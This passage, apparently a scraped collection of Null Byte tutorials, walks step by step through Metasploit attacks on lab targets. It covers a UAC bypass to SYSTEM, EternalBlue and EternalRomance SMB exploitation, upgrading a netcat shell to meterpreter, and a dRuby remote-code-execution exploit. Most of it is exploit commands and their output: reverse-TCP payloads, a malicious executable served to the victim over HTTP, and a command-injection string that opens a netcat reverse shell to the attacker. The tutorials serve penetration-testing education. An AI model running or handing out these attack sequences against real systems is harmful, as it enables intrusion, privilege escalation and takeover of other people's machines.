connect to\n* the -f flag sets the format\n* the -o flag specifies the output file\nNow that our file is saved, we need to set up a listener for it to connect back to once it is executed. Open up a new terminal tab or window and fire up Metasploit with the msfconsole command. We can use the versatile multi-handler to catch our reverse shell.\n~# msfconsole\nmsf5 > use exploit/multi/handler\nAll we need to do is set the options to match what we specified in the executable we created earlier. Set the payload, lhost, and lport as such:\nmsf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > set lhost 10.10.0.1\nlhost => 10.10.0.1\nmsf5 exploit(multi/handler) > set lport 1234\nlport => 1234\nType run and the handler will start listening for incoming connections.\nmsf5 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 10.10.0.1:1234\nBack in our working directory, we can start an HTTP server to host our file, so all the victim has to do is connect to us, download the file, and run it. In the real world, this could be accomplished in any number of ways, including social engineering or a phishing attack. For now, though, we will keep it simple.\nWe could start Apache and serve the file from there, but there's a Python has a built-in module called SimpleHTTPServer that is lightweight, easy to use, and can be run from anywhere without any setup. Start it with the following command.\n~/temp# python -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\nNow all the victim has to do is connect to our machine on port 8000 to get the file. On the target, browse to the IP address of the attacking machine and download the file.\nhttp://10.10.0.1:8000/pwn.exe\nThen, simply save it and run it:\nIf everything goes smoothly, we should see a Meterpreter session established back on our handler.\nmsf5 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 10.10.0.1:1234\n[*] Sending stage (206403 bytes) to 10.10.0.104\n[*] Meterpreter session 1 opened (10.10.0.1:1234 -> 10.10.0.104:49224) at 2019-04-08 11:22:17 -0500\nAt this point, we can stop the Python server since we have successfully connected to the target.\nStep 2: Attempt Privilege Escalation\nNow that we have a Meterpreter session, we can see what user we are running as with the getuid command.\nmeterpreter > getuid\nServer username: DLAB\\admin2\nThe name shows up as \"admin2,\" so it's a good chance this user has administrative privileges. Let's try to escalate using the getsystem command.\nmeterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)\nAnd it fails. We can see that this command tries three methods of privilege escalation, and it's giving us an environment error. We can actually try each of these methods out separately. Use the -h flag to display the help for this command.\nmeterpreter > getsystem -h\nUsage: getsystem [options]\nAttempt to elevate your privilege to that of local system.\n-h        Help Banner.\n-t <opt>  The technique to use. (Default to '0').\n0 : All techniques available\n1 : Named Pipe Impersonation (In Memory/Admin)\n2 : Named Pipe Impersonation (Dropper/Admin)\n3 : Token Duplication (In Memory/Admin)\nIf we use the -t flag, we can specify which technique to use. Let's try the first one:\nmeterpreter > getsystem -t 1\n[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\nNow we can see it is giving us an \"Access is denied\" error message. It might not seem like it, but this is good. Next, we will bypass UAC and get System access.\nStep 3: Bypass UAC\nWe can use a Metasploit module to bypass the UAC feature on Windows, but first, we need to background our current session. Type background to do so.\nmeterpreter > background\n[*] Backgrounding session 1...\nIn Metasploit, use the search command to find a suitable exploit.\nmsf5 > search uac\nMatching Modules\n================\n#   Name                                              Disclosure Date  Rank       Check  Description\n-   ----                                              ---------------  ----       -----  -----------\n1   exploit/windows/local/ask                         2012-01-03       excellent  No     Windows Escalate UAC Execute RunAs\n2   exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass\n3   exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)\n4   exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)\n5   exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)\n6   exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)\n7   exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS\n8   exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)\n9   exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)\n10  post/windows/gather/win_privs                                      normal     No     Windows Gather Privileges Enumeration\n11  post/windows/manage/sticky_keys                                    normal     No     Sticky Keys Persistance Module\nWe want number two, the \"bypassuac\" exploit — load the module with the use command.\nmsf5 > use exploit/windows/local/bypassuac\nTake a look at the options to see what we need.\nmsf5 exploit(windows/local/bypassuac) > options\nModule options (exploit/windows/local/bypassuac):\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nSESSION                     yes       The session to run this module on.\nTECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)\nExploit target:\n0   Windows x86\nIt looks like it needs the session we put in the background earlier, and we'll also need to set the target to 64-bit since we are using 64-bit Windows. Use the show command to view available targets.\nmsf5 exploit(windows/local/bypassuac) > show targets\nExploit targets:\n0   Windows x86\n1   Windows x64\nAnd set the target and session numbers.\nmsf5 exploit(windows/local/bypassuac) > set target 1\ntarget => 1\nmsf5 exploit(windows/local/bypassuac) > set session 1\nsession => 1\nWe also need to specify a payload, so again, we'll use the trusty Meterpreter reverse TCP.\nmsf5 exploit(windows/local/bypassuac) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/local/bypassuac) > set lhost 10.10.0.1\nlhost => 10.10.0.1\nmsf5 exploit(windows/local/bypassuac) > set lport 1234\nlport => 1234\nEverything should be good to go, so type run to launch the exploit.\nmsf5 exploit(windows/local/bypassuac) > run\n[*] Started reverse TCP handler on 10.10.0.1:1234\n[*] UAC is Enabled, checking level...\n[+] UAC is set to Default\n[+] BypassUAC can bypass this setting, continuing...\n[+] Part of Administrators group! Continuing...\n[*] Uploaded the agent to the filesystem....\n[*] Uploading the bypass UAC executable to the filesystem...\n[*] Meterpreter stager executable 7168 bytes long being uploaded..\n[*] Sending stage (206403 bytes) to 10.10.0.104\n[*] Meterpreter session 2 opened (10.10.0.1:1234 -> 10.10.0.104:49235) at 2019-04-08 11:30:04 -0500\nmeterpreter >\nWe can see it checks the UAC level and if the user is part of the Administrators group, and a new session is successfully opened. Let's run getuid once again.\nmeterpreter > getuid\nServer username: DLAB\\admin2\nWe can see we are still admin2 — the exploit doesn't automatically drop us into the System account. But now if we run getsystem, we are successfully able to bypass UAC and escalate privileges.\nmeterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nAnd now we can confirm that we finally have System access.\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nWrapping Up\nToday, we learned a little about UAC and how it protects Windows from unauthorized access. We covered how to get an initial foothold on the target and attempted privilege escalation. When that didn't work, we used a Metasploit module to bypass the restriction and ultimately get System-level privileges on the target.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Exploit EternalBlue on Windows Server with Metasploit",
        "link": "https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/",
        "content": "* WonderHowTo\nParticular vulnerabilities and exploits come along and make headlines with their catchy names and impressive potential for damage. EternalBlue is one of those exploits. Originally tied to the NSA, this zero-day exploited a flaw in the SMB protocol, affecting many Windows machines and wreaking havoc everywhere. Here, we will use EternalBlue to exploit SMB via Metasploit.\nWhat Is EternalBlue?\nEternalBlue is an exploit most likely developed by the NSA as a former zero-day. It was released in 2017 by the Shadow Brokers, a hacker group known for leaking tools and exploits used by the Equation Group, which has possible ties to the Tailored Access Operations unit of the NSA.\nEternalBlue, also known as MS17-010, is a vulnerability in Microsoft's Server Message Block (SMB) protocol. SMB allows systems to share access to files, printers, and other resources on the network. The vulnerability is allowed to occur because earlier versions of SMB contain a flaw that lets an attacker establish a null session connection via anonymous login. An attacker can then send malformed packets and ultimately execute arbitrary commands on the target.\nEternalBlue was mostly responsible for the WannaCry, NotPetya, and BadRabbit ransomware outbreaks, as well as the EternalRocks worm.\nOption 1: Exploit EternalBlue with Metasploit\nWe'll be using an unpatched copy of Windows Server 2008 R2 as the target for the first section of this tutorial. An evaluation copy can be downloaded from Microsoft so that you can better follow along.\nStep 1: Find a Module to Use\nThe first thing we need to do is open up the terminal and start Metasploit. Type service postgresql start to initialize the PostgreSQL database, if it is not running already, followed by msfconsole.\nservice postgresql start\nNext, use the search command within Metasploit to locate a suitable module to use.\nsearch eternalblue\nMatching Modules\n================\nName                                           Disclosure Date  Rank     Check  Description\n----                                           ---------------  ----     -----  -----------\nauxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\nauxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection\nexploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\nexploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\nexploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\nThere is an auxiliary scanner that we can run to determine if a target is vulnerable to MS17-010. It's always a good idea to perform the necessary recon like this. Otherwise, you could end up wasting a lot of time if the target isn't even vulnerable.\nOnce we have determined that our target is indeed vulnerable to EternalBlue, we can use the following exploit module from the search we just did.\nuse exploit/windows/smb/ms17_010_eternalblue\nYou'll know you're good if you see the \"exploit(windows/smb/ms17_010_eternalblue)\" prompt.\nStep 2: Run the Module\nWe can take a look at the current settings with the options command.\nModule options (exploit/windows/smb/ms17_010_eternalblue):\nName           Current Setting  Required  Description\n----           ---------------  --------  -----------\nRHOSTS                          yes       The target address range or CIDR identifier\nRPORT          445              yes       The target port (TCP)\nSMBDomain      .                no        (Optional) The Windows domain to use for authentication\nSMBPass                         no        (Optional) The password for the specified username\nSMBUser                         no        (Optional) The username to authenticate as\nVERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\nVERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\nExploit target:\n0   Windows 7 and Server 2008 R2 (x64) All Service Packs\nFirst, we need to specify the IP address of the target.\nset rhosts 10.10.0.101\nNext, we can load the trusty reverse_tcp shell as the payload.\nset payload windows/x64/meterpreter/reverse_tcp\nFinally, set the listening host to the IP address of our local machine.\nset lhost 10.10.0.1\nAnd the listening port to a suitable number.\nset lport 4321\nlport => 4321\nThat should be everything, so the only thing left to do is launch the exploit. Use the run command to fire it off.\n[*] Started reverse TCP handler on 10.10.0.1:4321\n[*] 10.10.0.101:445 - Connecting to target for exploitation.\n[+] 10.10.0.101:445 - Connection established for exploitation.\n[+] 10.10.0.101:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.0.101:445 - CORE raw buffer dump (51 bytes)\n[*] 10.10.0.101:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2\n[*] 10.10.0.101:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard\n[*] 10.10.0.101:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac\n[*] 10.10.0.101:445 - 0x00000030  6b 20 31                                         k 1\n[+] 10.10.0.101:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.0.101:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.0.101:445 - Sending all but last fragment of exploit packet\n[*] 10.10.0.101:445 - Starting non-paged pool grooming\n[+] 10.10.0.101:445 - Sending SMBv2 buffers\n[+] 10.10.0.101:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.0.101:445 - Sending final SMBv2 buffers.\n[*] 10.10.0.101:445 - Sending last fragment of exploit packet!\n[*] 10.10.0.101:445 - Receiving response from exploit packet\n[+] 10.10.0.101:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.0.101:445 - Sending egg to corrupted connection.\n[*] 10.10.0.101:445 - Triggering free of corrupted buffer.\n[*] Sending stage (206403 bytes) to 10.10.0.101\n[*] Meterpreter session 1 opened (10.10.0.1:4321 -> 10.10.0.101:49207) at 2019-03-26 11:01:46 -0500\n[+] 10.10.0.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\nmeterpreter >\nWe see a few things happen here, like the SMB connection being established and the exploit packet being sent. At last, we see a \"WIN\" and a Meterpreter session is opened. Sometimes, this exploit will not complete successfully the first time, so if it doesn't just try again and it should go through.\nStep 3: Verify the Target Is Compromised\nWe can verify we have compromised the target by running commands such as sysinfo to obtain operating system information.\nComputer        : S02\nOS              : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : DLAB\nLogged On Users : 2\nMeterpreter     : x64/windows\nAnd getuid to get the current username.\nServer username: NT AUTHORITY\\SYSTEM\nThis exploit doesn't work very well on newer systems, and in some cases, it can crash the target machine. Next, we will explore a similar exploit that is a little more reliable, but just as deadly.\nOption 2: EternalRomance / EternalSynergy / EternalChampion\nAs if EternalBlue wasn't devastating enough, three more similar exploits were developed after it. EternalRomance and EternalSynergy exploit a type of confusion (CVE-2017-0143), while EternalChampion and EternalSynergy exploit a race condition (CVE-2017-0146).\nThese were combined into a single Metasploit module that also uses the classic psexec payload. It's considered more reliable than EternalBlue, less likely to crash the target, and works on all recent unpatched versions of Windows, up to Server 2016 and Windows 10.\n* Don't Miss: How to Discover Computers Vulnerable to EternalRomance\nThe only caveat is this exploit requires a named pipe. Named pipes provide a method for running processes to communicate with one another, usually appearing as a file for other processes to attach to. The Metasploit module automatically checks for named pipes, making it pretty straightforward to use as long as a named pipe is present on the target.\nStep 1: Find a Vulnerable Target\nWe can use Nmap as an alternative to the Metasploit scanner to discover if a target is vulnerable to EternalBlue. The Nmap Scripting Engine is a powerful feature of the core tool that allows all kinds of scripts to run against a target.\nHere, we'll be using the smb-vuln-ms17-010 script to check for the vulnerability. Our target will be an unpatched copy of Windows Server 2016 Datacenter edition. Evaluation copies can be downloaded from Microsoft so you can follow along if you want.\nWe can specify a single script to run with the --script option, along with the -v flag for verbosity and our target's IP address. First, change directories in case you're still running Metasploit.\nnmap --script smb-vuln-ms17-010 -v 10.10.0.100\nNmap will start running and shouldn't take too long since we are only running one script. At the bottom of the output, we'll find the results.\nStarting Nmap 7.70 ( https://nmap.org ) at 2019-03-26 11:05 CDT\nNSE: Loaded 1 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 11:05\nHost script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|     Disclosure date: 2017-03-14\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\nNSE: Script Post-scanning.\nInitiating NSE at 11:05\nCompleted NSE at 11:05, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 2.31 seconds\nRaw packets sent: 1181 (51.948KB) | Rcvd: 1001 (40.060KB)\nWe can see it lists the target as vulnerable, along with additional information like risk factors and links to the CVE.\nStep 2: Find a Module to Use\nNow that we know the target is vulnerable, we can go back to Metasploit and search for an appropriate exploit.\nsearch eternalromance\nMatching Modules\n================\nName                                  Disclosure Date  Rank    Check  Description\n----                                  ---------------  ----    -----  -----------\nauxiliary/admin/smb/ms17_010_command  2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\nexploit/windows/smb/ms17_010_psexec   2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\nAnd load the module in Metasploit with the use command.\nuse exploit/windows/smb/ms17_010_psexec\nYou'll know you're good if you see the \"exploit(windows/smb/ms17_010_psexec)\" prompt.\nStep 3: Run the Module\nLet's take a look at our options:\nModule options (exploit/windows/smb/ms17_010_psexec):\nName                  Current Setting                                                 Required  Description\n----                  ---------------                                                 --------  -----------\nDBGTRACE              false                                                           yes       Show extra debug trace info\nLEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction\nNAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)\nNAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check\nRHOSTS                                                                                yes       The target address range or CIDR identifier\nRPORT                 445                                                             yes       The Target port\nSERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing\nSERVICE_DISPLAY_NAME                                                                  no        The service display name\nSERVICE_NAME                                                                          no        The service name\nSHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\nSMBDomain             .                                                               no        The Windows domain to use for authentication\nSMBPass                                                                               no        The password for the specified username\nSMBUser                                                                               no        The username to authenticate as\nExploit target:\n0   Automatic\nIt looks like this exploit uses a list of named pipes to check and connects to a share. We can leave all this as default for now, but we need to set the remote host.\nset rhosts 10.10.0.100\nAnd the reverse shell payload.\nset payload windows/x64/meterpreter/reverse_tcp",
        "category": "Metasploit Basics"
    },
    {
        "title": "Elevate a Netcat Shell to a Meterpreter Session for More Power & Control",
        "link": "https://null-byte.wonderhowto.com/how-to/elevate-netcat-shell-meterpreter-session-for-more-power-control-0193211/",
        "content": "* WonderHowTo\nPopping a shell is often the main goal of a hacker, and it can be exciting when executed properly, but sometimes they do have their limitations. Metasploit's Meterpreter probably needs no introduction, but this powerful, dynamic payload can offer a leg up over normal shells. To prove it, we'll show how to take a normal command shell and elevate it to a Meterpreter session.\nShell vs. Meterpreter\nA shell is basically an interface that acts as a shortcut to the commands of an operating system. When it comes to hacking, there are two types of shells that are mainly talked about: bind shells and reverse shells.\nA bind shell effectively binds itself to a certain port on the target, and the attacking system connects to that listening port and a session is created. A reverse shell, on the other hand, actively connects from the target machine to the attacking machine, where a listener is waiting for incoming connections.\nCommand shells provide a great way to really dig into the target, but they are not always the best option. Usually, they are constrained to the privileges of the user who initiated the shell, so the power that comes with root-level access isn't always available.\nRecommended on Amazon: Metasploit: The Penetration Tester's Guide\nMeterpreter allows us to run post-exploitation modules and privilege escalation exploits locally on the target. It utilizes encrypted communication methods and nothing is written to disk during operation, making it a suitable weapon that leaves little to no evidence behind. Meterpreter offers a ton of other features and is highly extensible, which makes it an excellent addition to any hacker's arsenal.\nStep 1: Start a Listener\nTo get started, fire up Metasploit. Type msfconsole in the terminal and we'll be greeted by a nice little welcome banner after it loads. We'll be using a great feature of Metasploit, which is the ability to set up a universal listener that can handle a wide range of different types of shells. Enter the following to load the module:\nuse exploit/multi/handler\nNext, we need to specify the listening host and port, using the IP address of our local machine and an arbitrary port number. We also need to set the payload — the versatile reverse TCP shell is an excellent choice here.\nmsf5 exploit(multi/handler) > set lhost 172.16.1.100\nlhost => 172.16.1.100\nmsf5 exploit(multi/handler) > set lport 1234\nlport => 1234\nmsf5 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp\npayload => linux/x86/shell/reverse_tcp\nType options at the prompt to verify that our settings are correct.\nmsf5 exploit(multi/handler) > options\nModule options (exploit/multi/handler):\nName  Current Setting  Required  Description\n----  ---------------  --------  -----------\nPayload options (linux/x86/shell/reverse_tcp):\nName   Current Setting  Required  Description\n----   ---------------  --------  -----------\nLHOST  172.16.1.100     yes       The listen address (an interface may be specified)\nLPORT  1234             yes       The listen port\nExploit target:\n0   Wildcard Target\nIt looks like we're good to go. Type run to launch the handler, and it's now ready and waiting for an incoming connection.\nmsf5 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 172.16.1.100:1234\nStep 2: Get Shell with Netcat\nNetcat is a powerful networking utility commonly used to troubleshoot connectivity issues, but it can also be utilized as a backdoor via command shells. We can use this tool, coupled with a command injection vulnerability, to spawn a shell and connect back to our local machine. If all goes well, the handler that we set up earlier will catch the shell and we'll be able to issue commands.\nThis vulnerability lets us append system commands to the input for the ping utility.\n127.0.0.1 && nc 172.16.1.100 1234 -e /bin/sh\nHere, we've tacked on the Netcat command to spawn a shell and connect to our local machine on port 1234:\nAfter a moment, back in the terminal with our handler, we see that a session is opened up. We can now issue commands like id and uname -a to verify this.\n[*] Sending stage (36 bytes) to 172.16.1.102\n[*] Command shell session 1 opened (172.16.1.100:1234 -> 172.16.1.102:53462) at 2019-01-29 15:28:28 -0600\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\nFinally, we need to background this session by pressing Ctrl-Z, followed by Y to confirm.\nBackground session 1? [y/N]  y\nmsf5 exploit(multi/handler) >\nRecommended on Amazon: Instant Netcat Starter\nStep 3: Elevate Shell to Meterpreter Session\nNow that we have attained a session on the target, we can upgrade that humble shell to a full-fledged Meterpreter session. This will allow for greater flexibility when it comes to interacting with the target.\nIn order to view any sessions that are currently open, type sessions at the prompt. Below, we can see the session we opened earlier, along with its ID, shell type, and connection information.\nmsf5 exploit(multi/handler) > sessions\nActive sessions\n===============\nId  Name  Type             Information  Connection\n--  ----  ----             -----------  ----------\n1         shell x86/linux               172.16.1.100:1234 -> 172.16.1.102:53462 (172.16.1.102)\nThe easiest way to transform a regular session into a Meterpreter session is to use the -u flag. Issue the sessions command with the appropriate ID and watch the magic happen.\nmsf5 exploit(multi/handler) > sessions -u 1\n[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 172.16.1.100:4433\n[*] Sending stage (914728 bytes) to 172.16.1.102\n[*] Meterpreter session 2 opened (172.16.1.100:4433 -> 172.16.1.102:42790) at 2019-01-29 15:30:28 -0600\n[*] Command stager progress: 100.00% (773/773 bytes)\nNow it seems like nothing really happened, but in fact, we've opened a Meterpreter session in the background — it doesn't automatically drop us into it. If we issue the sessions command again, it will list our new Meterpreter session with an ID of 2. We can then use the -i flag to interact with it.\nmsf5 exploit(multi/handler) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter >\nAnd now we have a Meterpreter shell. However, there is one other way to elevate a normal shell to a Meterpreter session that is similar to the method outlined above, and that is to manually use the shell_to_meterpreter post-exploitation module.\nAlternative Way to Elevate Shell to Meterpreter Session\nTo load it, type the following.\nuse post/multi/manage/shell_to_meterpreter\nAll we have to do is specify the existing session we want to upgrade. After that, just to be sure, we can view the current settings with the options command.\nmsf5 post(multi/manage/shell_to_meterpreter) > set session 1\nsession => 1\nmsf5 post(multi/manage/shell_to_meterpreter) > options\nModule options (post/multi/manage/shell_to_meterpreter):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nHANDLER  true             yes       Start an exploit/multi/handler to receive the connection\nLHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).\nLPORT    4433             yes       Port for payload to connect to.\nSESSION  1                yes       The session to run this module on.\nType run to kick it off.\nmsf5 post(multi/manage/shell_to_meterpreter) > run\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 172.16.1.100:4433\n[*] Sending stage (914728 bytes) to 172.16.1.102\n[*] Meterpreter session 3 opened (172.16.1.100:4433 -> 172.16.1.102:59832) at 2019-01-29 15:34:16 -0600\n[*] Command stager progress: 100.00% (773/773 bytes)\n[*] Post module execution completed\nAgain, this opens up the new session in the background, so we have to issue the sessions command to determine the correct ID.\nmsf5 post(multi/manage/shell_to_meterpreter) > sessions\nActive sessions\n===============\nId  Name  Type                   Information  Connection\n--  ----  ----                   -----------  ----------\n1         shell x86/linux                     172.16.1.100:1234 -> 172.16.1.102:53462 (172.16.1.102)\n3         meterpreter x86/linux               172.16.1.100:4433 -> 172.16.1.102:59832 (172.16.1.102)\nWe can see that this new Meterpreter session has an ID of 3. Now we are ready to interact with it.\nmsf5 post(multi/manage/shell_to_meterpreter) > sessions -i 3\n[*] Starting interaction with 3...\nmeterpreter >\nWe now have a Meterpreter shell, and from here, the sky is the limit.\nWrapping Thing's Up\nIn this tutorial, we learned how to take a regular old command shell and elevate it to Meterpreter status. We used a Netcat shell here, but any other type of shell should work with this method. Meterpreter offers a great deal of power and control over any target, so get out there and keep hacking away.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Hack Distributed Ruby with Metasploit & Perform Remote Code Execution",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-distributed-ruby-with-metasploit-perform-remote-code-execution-0192644/",
        "content": "* WonderHowTo\nThings that are supposed to make life easier for developers and users are often easy targets for exploitation by hackers. Like many situations in the tech world, there is usually a trade-off between convenience and security. One such trade-off is found in a system known as Distributed Ruby, which can be compromised easily with Metasploit.\nOverview of Distributed Ruby\nDistributed Ruby, also known as dRuby, or DRb, is a distributed object system for the Ruby programming language that allows for remote method calls between Ruby processes, even if they are on different machines. It uses its own protocol and is written entirely in pure Ruby.\nThis makes for a flexible service that developers can use to enhance certain programs, but it also opens up a security flaw when not properly implemented, such as in older versions of dRuby. Since this is typically used for smaller projects and novice programs, there usually isn't a lot of concern for security issues.\n* Don't Miss: Perform Local Privilege Escalation Using a Linux Kernel Exploit\nThe Metasploit module we will be using automatically tries to exploit the vulnerable instance_eval and syscall methods in order to compromise the service and obtain a shell. We will be testing this on Metasploitable 2, an intentionally vulnerable virtual machine which is running an insecure version of dRuby.\nStep 1: Verify the Vulnerability\nThe first thing we need to do is confirm that Distributed Ruby (dRuby) is running on our target. When dRuby is initially set up, it binds itself to a specific URI and port, in this case, port 8787. We can run an Nmap scan on this port to make sure.\nUse the -sV flag to identify service and version information, followed by the IP address of the target, and finally, set port 8787 with the -p flag, since this port is outside of Nmap's default list of common ports that are scanned.\nnmap -sV 172.16.1.102 -p 8787\n[*] exec: nmap -sV 172.16.1.102 -p 8787\nStarting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 10:07 CST\nNmap scan report for 172.16.1.102\nHost is up (0.0013s latency).\nPORT     STATE SERVICE VERSION\n8787/tcp open  drb     Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)\nMAC Address: 08:00:27:77:62:6C (Oracle VirtualBox virtual NIC)\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.65 seconds\nWe can see that the dRuby service is present and running. Now, let's search for an exploit to use.\nStep 2: Search for an Exploit\nFire up Metasploit with msfconsole, and type search drb to display any matching results.\nmsf > search drb\nMatching Modules\n================\nName                                                   Disclosure Date  Rank       Check  Description\n----                                                   ---------------  ----       -----  -----------\nexploit/linux/misc/drb_remote_codeexec                 2011-03-23       excellent  No     Distributed Ruby Remote Code Execution\nexploit/multi/misc/wireshark_lwres_getaddrbyname       2010-01-27       great      No     Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow\nexploit/multi/misc/wireshark_lwres_getaddrbyname_loop  2010-01-27       great      No     Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)\nIt looks like the drb_remote_codeexec is exactly what we need. Load up the exploit with the use command followed by the path of the module.\nmsf > use exploit/linux/misc/drb_remote_codeexec\nNow that we are positioned within this module, we can view information about it using the info command.\nmsf exploit(linux/misc/drb_remote_codeexec) > info\nName: Distributed Ruby Remote Code Execution\nModule: exploit/linux/misc/drb_remote_codeexec\nPlatform: Unix\nPrivileged: No\nLicense: Metasploit Framework License (BSD)\nRank: Excellent\nDisclosed: 2011-03-23\nProvided by:\njoernchen <joernchen@phenoelit.de>\nAvailable targets:\n0   Automatic\n3   Syscall\nCheck supported:\nBasic options:\nName   Current Setting  Required  Description\n----   ---------------  --------  -----------\nRHOST                   no        The target address\nRPORT  8787             yes       The target port\nURI                     no        The URI of the target host (druby://host:port) (overrides RHOST/RPORT)\nPayload information:\nSpace: 32768\nDescription:\nThis module exploits remote code execution vulnerabilities in dRuby.\nReferences:\nCVE: Not available\nhttp://www.ruby-doc.org/stdlib-1.9.3/libdoc/drb/rdoc/DRb.html\nhttp://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/\nhttp://bugkraut.de/posts/tainting\nThis gives us some details about the exploit such as platform information, the initial disclosure date of the vulnerability, and options available for this exploit.\nStep 3: Launch the Exploit\nNow, we're ready to begin setting our options. We can set the IP address of our target with the set rhost command.\nmsf exploit(linux/misc/drb_remote_codeexec) > set rhost 172.16.1.102\nrhost => 172.16.1.102\nNext, we can view the available payloads for this module using the show payloads command.\nmsf exploit(linux/misc/drb_remote_codeexec) > show payloads\nCompatible Payloads\n===================\nName                                Disclosure Date  Rank    Check  